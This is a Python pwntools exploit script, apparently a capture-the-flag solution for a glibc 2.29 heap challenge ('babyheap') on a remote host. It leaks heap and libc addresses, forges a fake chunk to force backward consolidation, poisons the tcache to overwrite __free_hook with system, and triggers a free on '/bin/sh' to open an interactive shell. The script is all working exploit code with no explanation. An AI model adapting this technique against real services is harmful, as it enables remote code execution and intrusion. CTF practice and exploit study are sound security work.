from pwn import *

#r = process("./babyheap2.29")
r = remote("192.168.201.21",1904)
r.recvuntil(": ")

def alloc(size):
    r.sendline("1")
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")

def update(index, size, content):
    r.sendline("2")
    r.recvuntil(": ")
    r.sendline(str(index))
    r.recvuntil(": ")
    r.sendline(str(size))
    r.recvuntil(": ")
    r.send(content)
    r.recvuntil(": ")

def free(index):
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline(str(index))
    r.recvuntil(": ")

def view(index):
    r.sendline("4")
    r.recvuntil(": ")
    r.sendline(str(index))
    r.recvuntil(": ")
    return r.recvuntil(": ")

alloc(0x38)
alloc(0x38)
free(1)
free(0)
alloc(0x38)
leak = u64(view(0).split("\n")[0].strip().ljust(8, "\x00"))
print hex(leak)
free(0)

for i in range(7+6):
  alloc(0xf8)
for i in range(7):
  free(i)
seven = leak + 0x740
ten = leak + 0xa50
eleven = leak + 0xb50
update(8, 0xf8, "A"*0xf0 + p64(0x1f0))

fake = p64(0x0) + p64(0x1f1) + p64(eleven) + p64(ten)
fake = p64(0x0) + p64(0x1f1) + p64(seven) + p64(seven)
update(7, len(fake), fake)
#fake = p64(0x0) + p64(0x1f1) + p64(seven) + p64(seven)
#update(10, len(fake), fake)
#fake = p64(0x0) + p64(0x1f1) + p64(seven) + p64(seven)
#update(11, len(fake), fake)

free(9)
#update(7, 0x10, "A"*0x10)
#libc = view(7)

alloc(0xf8)
alloc(0xf8)
alloc(0xf8)
alloc(0xf8)
#free(8)
alloc(0xe8)

libc = u64(view(8).split("\n")[0].strip().ljust(8, "\x00")) - 0x1e4ca0
print hex(libc)
alloc(0x48)

mallochook = libc + 0x1e4c30
freehook = libc + 0x1e75a8
system = libc + 0x52fd0
key = leak - 0x290

free(5)
update(8, 0x10, p64(freehook) + p64(key))

alloc(0x48)
alloc(0x48) #6
update(6, 0x10, p64(system)*2)
update(5, 0x8, "/bin/sh\x00")

r.sendline("3")
r.sendline("5")
r.interactive()

